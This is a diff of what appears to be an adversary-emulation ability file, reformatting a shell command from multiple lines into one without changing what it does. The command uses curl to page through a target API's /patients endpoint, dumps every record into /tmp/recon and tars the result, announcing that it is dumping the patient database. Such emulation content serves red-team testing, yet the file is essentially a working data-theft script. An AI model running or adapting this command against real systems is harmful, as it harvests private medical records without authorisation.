@@ -9,19 +9,4 @@
     linux:
       sh:
         command: |
-          OUTDIR="/tmp/recon"; API_BASE="#{api.scheme}://#{api.host}:#{api.port}"; mkdir -p "$OUTDIR"; TS=$(date +%Y%m%d_%H%M%S); RAW="$OUTDIR/db_raw_$TS.json"; \
-          echo "[*] Dumping patient database from $API_BASE..."; \
-          > "$RAW"; SKIP=0; LIMIT=100; \
-          while true; do \
-            PAGE_FILE="$OUTDIR/page_tmp.json"; \
-            CODE=$(curl -s -L -w "%{http_code}" -o "$PAGE_FILE" --connect-timeout 10 "$API_BASE/patients?skip=$SKIP&limit=$LIMIT"); \
-            if [ "$CODE" != "200" ]; then echo "[-] Error: API returned HTTP $CODE on skip=$SKIP" >&2; exit 1; fi; \
-            cat "$PAGE_FILE" >> "$RAW"; echo "" >> "$RAW"; \
-            BYTES=$(wc -c < "$PAGE_FILE"); \
-            if [ "$BYTES" -lt 200 ]; then break; fi; \
-            SKIP=$((SKIP + LIMIT)); \
-          done; \
-          rm -f "$OUTDIR/page_tmp.json"; \
-          SIZE=$(wc -c < "$RAW"); \
-          echo "[+] Downloaded $SIZE bytes of patient data"; \
-          tar czf "$OUTDIR/db_dump_$TS.tar.gz" -C "$OUTDIR" "db_raw_$TS.json" && echo "[+] Dump archived: $OUTDIR/db_dump_$TS.tar.gz"
+          OUTDIR="/tmp/recon"; API_BASE="#{api.scheme}://#{api.host}:#{api.port}"; mkdir -p "$OUTDIR"; TS=$(date +%Y%m%d_%H%M%S); RAW="$OUTDIR/db_raw_$TS.json"; echo "[*] Dumping patient database from $API_BASE..."; > "$RAW"; SKIP=0; LIMIT=100; while true; do PAGE_FILE="$OUTDIR/page_tmp.json"; CODE=$(curl -s -L -w "%{http_code}" -o "$PAGE_FILE" --connect-timeout 10 "$API_BASE/patients?skip=$SKIP&limit=$LIMIT"); if [ "$CODE" != "200" ]; then echo "[-] Error: API returned HTTP $CODE on skip=$SKIP" >&2; exit 1; fi; cat "$PAGE_FILE" >> "$RAW"; echo "" >> "$RAW"; BYTES=$(wc -c < "$PAGE_FILE"); if [ "$BYTES" -lt 200 ]; then break; fi; SKIP=$((SKIP + LIMIT)); done; rm -f "$OUTDIR/page_tmp.json"; SIZE=$(wc -c < "$RAW"); echo "[+] Downloaded $SIZE bytes of patient data"; tar czf "$OUTDIR/db_dump_$TS.tar.gz" -C "$OUTDIR" "db_raw_$TS.json" && echo "[+] Dump archived: $OUTDIR/db_dump_$TS.tar.gz"
